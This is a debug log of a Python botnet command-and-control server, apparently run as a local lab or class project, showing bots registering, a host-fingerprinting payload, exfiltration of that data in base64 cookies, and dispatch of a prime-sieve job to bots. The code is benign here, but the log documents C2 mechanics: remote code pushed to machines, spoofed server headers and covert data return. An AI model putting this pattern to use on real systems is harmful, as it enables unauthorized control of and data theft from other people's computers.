+DEBUG:root:In Server process
+INFO:root:Listening on port: 80
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET / HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+DEBUG:root:Creating new bot
+DEBUG:root:Sending: 1.1 200 OK
+Date: Fri, 09 Dec 2016 18:17:15
+Server: Apache
+Content-Length: 412
+Connection: close
+Content-Type:text/html
+F59JL5WU;388;getInfo.py;import os
+import platform
+import cPickle
+import urllib2
+import time
+
+def execute():
+    fqn = os.uname()[1]
+    machine = platform.machine()
+    OS = os.name + " " + platform.system() + " " + platform.release()
+    try:
+        ip = urllib2.urlopen('http://ip.42.pl/raw').read()
+    except:
+        ip = ''
+    t = time.strftime('%c')
+    info = [fqn, OS, machine, ip, t]
+    return info
+
+INFO:root:Bot: F59JL5WU;;;;;;0;
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /F59JL5WU/r/ HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Cookie: _res=KGxwMQpTJ3VidW50dS1jdGYnCnAyCmFTJ3Bvc2l4IExpbnV4IDQuNC4wLTUxLWdlbmVyaWMnCnAzCmFTJ3g4Nl82NCcKcDQKYVMnJwphUydGcmkgRGVjICA5IDE4OjE3OjE1IDIwMTYnCnA1CmEu _src=getInfo.py 
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Bot: F59JL5WU;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:17:15 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET / HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+DEBUG:root:Creating new bot
+DEBUG:root:Sending: 1.1 200 OK
+Date: Fri, 09 Dec 2016 18:17:20
+Server: Apache
+Content-Length: 412
+Connection: close
+Content-Type:text/html
+16OZ7AFY;388;getInfo.py;import os
+import platform
+import cPickle
+import urllib2
+import time
+
+def execute():
+    fqn = os.uname()[1]
+    machine = platform.machine()
+    OS = os.name + " " + platform.system() + " " + platform.release()
+    try:
+        ip = urllib2.urlopen('http://ip.42.pl/raw').read()
+    except:
+        ip = ''
+    t = time.strftime('%c')
+    info = [fqn, OS, machine, ip, t]
+    return info
+
+INFO:root:Bot: 16OZ7AFY;;;;;;0;
+INFO:root:Bot: F59JL5WU;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:17:15 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /16OZ7AFY/r/ HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Cookie: _res=KGxwMQpTJ3VidW50dS1jdGYnCnAyCmFTJ3Bvc2l4IExpbnV4IDQuNC4wLTUxLWdlbmVyaWMnCnAzCmFTJ3g4Nl82NCcKcDQKYVMnJwphUydGcmkgRGVjICA5IDE4OjE3OjIwIDIwMTYnCnA1CmEu _src=getInfo.py 
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Bot: 16OZ7AFY;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:17:20 2016
+INFO:root:Bot: F59JL5WU;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:17:15 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /F59JL5WU HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Command is: $GS$
+INFO:root:Before split $GS$
+INFO:root:Split command: GS
+INFO:root:Returning list of bots.
+INFO:root:Sending 16OZ7AFY  posix Linux 4.4.0-51-generic x86_64:F59JL5WU  posix Linux 4.4.0-51-generic x86_64:
+
+INFO:root:Command is: $GS$
+INFO:root:Before split $GS$
+INFO:root:Split command: GS
+INFO:root:Returning list of bots.
+INFO:root:Sending 16OZ7AFY  posix Linux 4.4.0-51-generic x86_64:F59JL5WU  posix Linux 4.4.0-51-generic x86_64:
+
+INFO:root:Bot: 16OZ7AFY;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:17:20 2016
+INFO:root:Bot: F59JL5WU;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:17:15 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /16OZ7AFY HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Command is: $GS$
+INFO:root:Before split $GS$
+INFO:root:Split command: GS
+INFO:root:Returning list of bots.
+INFO:root:Sending 16OZ7AFY  posix Linux 4.4.0-51-generic x86_64:F59JL5WU  posix Linux 4.4.0-51-generic x86_64:
+
+INFO:root:Bot: 16OZ7AFY;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:17:20 2016
+INFO:root:Bot: F59JL5WU;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:17:15 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /F59JL5WU HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Bot: 16OZ7AFY;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:17:20 2016
+INFO:root:Bot: F59JL5WU;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:17:15 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /16OZ7AFY HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Bot: 16OZ7AFY;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:17:20 2016
+INFO:root:Bot: F59JL5WU;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:17:15 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /F59JL5WU HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Command is: $UP$16OZ7AFY:F59JL5WU$/home/shawn/actualbotnet/botnetproject/SievePayload.py
+INFO:root:Before split $UP$16OZ7AFY:F59JL5WU$/home/shawn/actualbotnet/botnetproject/SievePayload.py
+INFO:root:Split command: UP
+DEBUG:root:Adding payload: 6QW8KES2
+INFO:root:Bot: 16OZ7AFY;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:17:20 2016
+INFO:root:Bot: F59JL5WU;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:17:15 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 1
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /16OZ7AFY HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+DEBUG:root:Checking if is target
+DEBUG:root:Checking payload: 6QW8KES2
+DEBUG:root:Targets: 2
+DEBUG:root:Is in 6QW8KES2
+DEBUG:root:Payload selected: 6QW8KES2
+DEBUG:root:tempcommand = ['16OZ7AFY', 'F59JL5WU']
+DEBUG:root:Unexpected Error: 'str' object has no attribute 'ID'
+INFO:root:Bot: 16OZ7AFY;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:17:20 2016
+INFO:root:Bot: F59JL5WU;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:17:15 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 1
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /F59JL5WU HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+DEBUG:root:Checking if is target
+DEBUG:root:Checking payload: 6QW8KES2
+DEBUG:root:Targets: 2
+DEBUG:root:Is in 6QW8KES2
+DEBUG:root:Payload selected: 6QW8KES2
+DEBUG:root:tempcommand = ['16OZ7AFY', 'F59JL5WU']
+DEBUG:root:Unexpected Error: 'str' object has no attribute 'ID'
+INFO:root:Bot: 16OZ7AFY;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:17:20 2016
+INFO:root:Bot: F59JL5WU;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:17:15 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 1
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /16OZ7AFY HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+DEBUG:root:Checking if is target
+DEBUG:root:Checking payload: 6QW8KES2
+DEBUG:root:Targets: 2
+DEBUG:root:Is in 6QW8KES2
+DEBUG:root:Payload selected: 6QW8KES2
+DEBUG:root:tempcommand = ['16OZ7AFY', 'F59JL5WU']
+DEBUG:root:Unexpected Error: 'str' object has no attribute 'ID'
+INFO:root:Starting main.
+DEBUG:root:Before Server Process
+INFO:root:Started server process
+INFO:root:Connecting to GUI 
+INFO:root:Connected to GUI 
+INFO:root:Command is: $GS$
+INFO:root:Before split $GS$
+INFO:root:Split command: GS
+INFO:root:Returning list of bots.
+INFO:root:Sending 
+
+DEBUG:root:In Server process
+INFO:root:Listening on port: 80
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET / HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+DEBUG:root:Creating new bot
+DEBUG:root:Sending: 1.1 200 OK
+Date: Fri, 09 Dec 2016 18:19:02
+Server: Apache
+Content-Length: 412
+Connection: close
+Content-Type:text/html
+FASSSV61;388;getInfo.py;import os
+import platform
+import cPickle
+import urllib2
+import time
+
+def execute():
+    fqn = os.uname()[1]
+    machine = platform.machine()
+    OS = os.name + " " + platform.system() + " " + platform.release()
+    try:
+        ip = urllib2.urlopen('http://ip.42.pl/raw').read()
+    except:
+        ip = ''
+    t = time.strftime('%c')
+    info = [fqn, OS, machine, ip, t]
+    return info
+
+INFO:root:Bot: FASSSV61;;;;;;0;
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /FASSSV61/r/ HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Cookie: _res=KGxwMQpTJ3VidW50dS1jdGYnCnAyCmFTJ3Bvc2l4IExpbnV4IDQuNC4wLTUxLWdlbmVyaWMnCnAzCmFTJ3g4Nl82NCcKcDQKYVMnJwphUydGcmkgRGVjICA5IDE4OjE5OjAyIDIwMTYnCnA1CmEu _src=getInfo.py 
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Bot: FASSSV61;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:19:02 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET / HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+DEBUG:root:Creating new bot
+DEBUG:root:Sending: 1.1 200 OK
+Date: Fri, 09 Dec 2016 18:19:06
+Server: Apache
+Content-Length: 412
+Connection: close
+Content-Type:text/html
+RQMIWCNY;388;getInfo.py;import os
+import platform
+import cPickle
+import urllib2
+import time
+
+def execute():
+    fqn = os.uname()[1]
+    machine = platform.machine()
+    OS = os.name + " " + platform.system() + " " + platform.release()
+    try:
+        ip = urllib2.urlopen('http://ip.42.pl/raw').read()
+    except:
+        ip = ''
+    t = time.strftime('%c')
+    info = [fqn, OS, machine, ip, t]
+    return info
+
+INFO:root:Bot: RQMIWCNY;;;;;;0;
+INFO:root:Bot: FASSSV61;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:19:02 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /RQMIWCNY/r/ HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Cookie: _res=KGxwMQpTJ3VidW50dS1jdGYnCnAyCmFTJ3Bvc2l4IExpbnV4IDQuNC4wLTUxLWdlbmVyaWMnCnAzCmFTJ3g4Nl82NCcKcDQKYVMnJwphUydGcmkgRGVjICA5IDE4OjE5OjA2IDIwMTYnCnA1CmEu _src=getInfo.py 
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Bot: RQMIWCNY;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:19:06 2016
+INFO:root:Bot: FASSSV61;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:19:02 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /FASSSV61 HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Command is: $GS$
+INFO:root:Before split $GS$
+INFO:root:Split command: GS
+INFO:root:Returning list of bots.
+INFO:root:Sending RQMIWCNY  posix Linux 4.4.0-51-generic x86_64:FASSSV61  posix Linux 4.4.0-51-generic x86_64:
+
+INFO:root:Command is: $GS$
+INFO:root:Before split $GS$
+INFO:root:Split command: GS
+INFO:root:Returning list of bots.
+INFO:root:Sending RQMIWCNY  posix Linux 4.4.0-51-generic x86_64:FASSSV61  posix Linux 4.4.0-51-generic x86_64:
+
+INFO:root:Command is: $GS$
+INFO:root:Before split $GS$
+INFO:root:Split command: GS
+INFO:root:Returning list of bots.
+INFO:root:Sending RQMIWCNY  posix Linux 4.4.0-51-generic x86_64:FASSSV61  posix Linux 4.4.0-51-generic x86_64:
+
+INFO:root:Bot: RQMIWCNY;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:19:06 2016
+INFO:root:Bot: FASSSV61;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:19:02 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /RQMIWCNY HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Bot: RQMIWCNY;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:19:06 2016
+INFO:root:Bot: FASSSV61;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:19:02 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /FASSSV61 HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Bot: RQMIWCNY;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:19:06 2016
+INFO:root:Bot: FASSSV61;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:19:02 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /RQMIWCNY HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Command is: $UP$RQMIWCNY:FASSSV61$/home/shawn/actualbotnet/botnetproject/SievePayload.py
+INFO:root:Before split $UP$RQMIWCNY:FASSSV61$/home/shawn/actualbotnet/botnetproject/SievePayload.py
+INFO:root:Split command: UP
+DEBUG:root:Adding payload: T9CBFFNH
+INFO:root:Bot: RQMIWCNY;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:19:06 2016
+INFO:root:Bot: FASSSV61;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:19:02 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 1
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /FASSSV61 HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+DEBUG:root:Checking if is target
+DEBUG:root:Checking payload: T9CBFFNH
+DEBUG:root:Targets: 2
+DEBUG:root:Is in T9CBFFNH
+DEBUG:root:Payload selected: T9CBFFNH
+DEBUG:root:tempcommand = ['RQMIWCNY', 'FASSSV61']
+DEBUG:root:botindex1 50
+DEBUG:root:Sending Response: 1.1 200 OK
+Date: Fri, 09 Dec 2016 18:19:27
+Server: Apache
+Content-Length: 1437
+Connection: close
+Content-Type:text/html
+1423;T9CBFFNH;#Sieve payload, XYZ12
+
+import math
+
+
+
+global DistSieveTarget
+
+global n
+
+global tlow
+
+global thigh
+
+global math
+
+
+
+def DistSieveTarget((n, tlow, thigh), B=None):
+
+    #sieve for use in threads of DistributedSieve
+
+    #n == number to sieve
+
+    #B == list of primes used to sieve
+
+    #A == partition we want to sieve
+
+    #tindex = first number A represents
+
+    print tlow, thigh
+
+    list1 = [True for _ in xrange(0, n+1)]#list of all numbers to sieve
+
+
+
+    list2 = [True for _ in xrange(0, thigh-tlow+1)]#list of numbers in this partition
+
+
+
+    outerlimit = math.sqrt(n)
+
+    i = 2
+
+    
+
+    while i <= outerlimit:
+
+        if list1[i]:
+
+            p = i ** 2
+
+            while p <= n:
+
+                list1[p] = False
+
+                p += i
+
+                
+
+            q = i ** 2
+
+            while q <= thigh:
+
+                if q < tlow:
+
+                    q += i
+
+                    continue
+
+                try:
+
+                    list2[q-tlow] = False
+
+                except:
+
+                    print tlow, thigh
+
+                    print q-tlow
+
+                    print list2
+
+                    print thigh-tlow+1
+
+                    raise IndexError
+
+                q += i
+
+        i += 1
+
+
+
+    C = [val+tlow for val, j in enumerate(list2) if j]
+
+
+
+    return C
+
+
+
+
+
+def execute():
+
+    return DistSieveTarget((n, tlow, thigh))
+
+
+
+n = 101
+
+tlow = 2
+
+thigh = 101
+
+tlow = 50
+thigh = 99
+
+INFO:root:Bot: RQMIWCNY;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:19:06 2016
+INFO:root:Bot: FASSSV61;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:19:02 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 1
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /FASSSV61/r/ HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Cookie: _res=KGxwMQpJNTMKYUk1OQphSTYxCmFJNjcKYUk3MQphSTczCmFJNzkKYUk4MwphSTg5CmFJOTcKYS4= _src=T9CBFFNH 
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Bot: RQMIWCNY;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:19:06 2016
+INFO:root:Bot: FASSSV61;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:19:02 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 1
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /RQMIWCNY HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+DEBUG:root:Checking if is target
+DEBUG:root:Checking payload: T9CBFFNH
+DEBUG:root:Targets: 2
+DEBUG:root:Is in T9CBFFNH
+DEBUG:root:Payload selected: T9CBFFNH
+DEBUG:root:tempcommand = ['RQMIWCNY', 'FASSSV61']
+INFO:root:Bot: RQMIWCNY;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:19:06 2016
+INFO:root:Bot: FASSSV61;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:19:02 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 1
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /FASSSV61 HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+DEBUG:root:Checking if is target
+DEBUG:root:Checking payload: T9CBFFNH
+DEBUG:root:Targets: 2
+INFO:root:Bot: RQMIWCNY;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:19:06 2016
+INFO:root:Bot: FASSSV61;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:19:02 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 1
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /FASSSV61 HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+DEBUG:root:Checking if is target
+DEBUG:root:Checking payload: T9CBFFNH
+DEBUG:root:Targets: 2
+INFO:root:Bot: RQMIWCNY;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:19:06 2016
+INFO:root:Bot: FASSSV61;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:19:02 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 1
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /FASSSV61 HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+DEBUG:root:Checking if is target
+DEBUG:root:Checking payload: T9CBFFNH
+DEBUG:root:Targets: 2
+INFO:root:Bot: RQMIWCNY;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:19:06 2016
+INFO:root:Bot: FASSSV61;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:19:02 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 1
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /FASSSV61 HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+DEBUG:root:Checking if is target
+DEBUG:root:Checking payload: T9CBFFNH
+DEBUG:root:Targets: 2
+INFO:root:Starting main.
+DEBUG:root:Before Server Process
+INFO:root:Started server process
+INFO:root:Connecting to GUI 
+INFO:root:Connected to GUI 
+INFO:root:Command is: $GS$
+INFO:root:Before split $GS$
+INFO:root:Split command: GS
+INFO:root:Returning list of bots.
+INFO:root:Sending 
+
+DEBUG:root:In Server process
+INFO:root:Listening on port: 80
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET / HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+DEBUG:root:Creating new bot
+DEBUG:root:Sending: 1.1 200 OK
+Date: Fri, 09 Dec 2016 18:20:45
+Server: Apache
+Content-Length: 412
+Connection: close
+Content-Type:text/html
+UMVU9VX4;388;getInfo.py;import os
+import platform
+import cPickle
+import urllib2
+import time
+
+def execute():
+    fqn = os.uname()[1]
+    machine = platform.machine()
+    OS = os.name + " " + platform.system() + " " + platform.release()
+    try:
+        ip = urllib2.urlopen('http://ip.42.pl/raw').read()
+    except:
+        ip = ''
+    t = time.strftime('%c')
+    info = [fqn, OS, machine, ip, t]
+    return info
+
+INFO:root:Bot: UMVU9VX4;;;;;;0;
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /UMVU9VX4/r/ HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Cookie: _res=KGxwMQpTJ3VidW50dS1jdGYnCnAyCmFTJ3Bvc2l4IExpbnV4IDQuNC4wLTUxLWdlbmVyaWMnCnAzCmFTJ3g4Nl82NCcKcDQKYVMnJwphUydGcmkgRGVjICA5IDE4OjIwOjQ1IDIwMTYnCnA1CmEu _src=getInfo.py 
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Bot: UMVU9VX4;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:20:45 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET / HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+DEBUG:root:Creating new bot
+DEBUG:root:Sending: 1.1 200 OK
+Date: Fri, 09 Dec 2016 18:20:48
+Server: Apache
+Content-Length: 412
+Connection: close
+Content-Type:text/html
+53L3F0GE;388;getInfo.py;import os
+import platform
+import cPickle
+import urllib2
+import time
+
+def execute():
+    fqn = os.uname()[1]
+    machine = platform.machine()
+    OS = os.name + " " + platform.system() + " " + platform.release()
+    try:
+        ip = urllib2.urlopen('http://ip.42.pl/raw').read()
+    except:
+        ip = ''
+    t = time.strftime('%c')
+    info = [fqn, OS, machine, ip, t]
+    return info
+
+INFO:root:Bot: UMVU9VX4;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:20:45 2016
+INFO:root:Bot: 53L3F0GE;;;;;;0;
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /53L3F0GE/r/ HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Cookie: _res=KGxwMQpTJ3VidW50dS1jdGYnCnAyCmFTJ3Bvc2l4IExpbnV4IDQuNC4wLTUxLWdlbmVyaWMnCnAzCmFTJ3g4Nl82NCcKcDQKYVMnJwphUydGcmkgRGVjICA5IDE4OjIwOjQ4IDIwMTYnCnA1CmEu _src=getInfo.py 
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Bot: UMVU9VX4;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:20:45 2016
+INFO:root:Bot: 53L3F0GE;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:20:48 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /UMVU9VX4 HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Bot: UMVU9VX4;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:20:45 2016
+INFO:root:Bot: 53L3F0GE;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:20:48 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /53L3F0GE HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Command is: $GS$
+INFO:root:Before split $GS$
+INFO:root:Split command: GS
+INFO:root:Returning list of bots.
+INFO:root:Sending UMVU9VX4  posix Linux 4.4.0-51-generic x86_64:53L3F0GE  posix Linux 4.4.0-51-generic x86_64:
+
+INFO:root:Command is: $GS$
+INFO:root:Before split $GS$
+INFO:root:Split command: GS
+INFO:root:Returning list of bots.
+INFO:root:Sending UMVU9VX4  posix Linux 4.4.0-51-generic x86_64:53L3F0GE  posix Linux 4.4.0-51-generic x86_64:
+
+INFO:root:Command is: $GS$
+INFO:root:Before split $GS$
+INFO:root:Split command: GS
+INFO:root:Returning list of bots.
+INFO:root:Sending UMVU9VX4  posix Linux 4.4.0-51-generic x86_64:53L3F0GE  posix Linux 4.4.0-51-generic x86_64:
+
+INFO:root:Bot: UMVU9VX4;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:20:45 2016
+INFO:root:Bot: 53L3F0GE;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:20:48 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /UMVU9VX4 HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
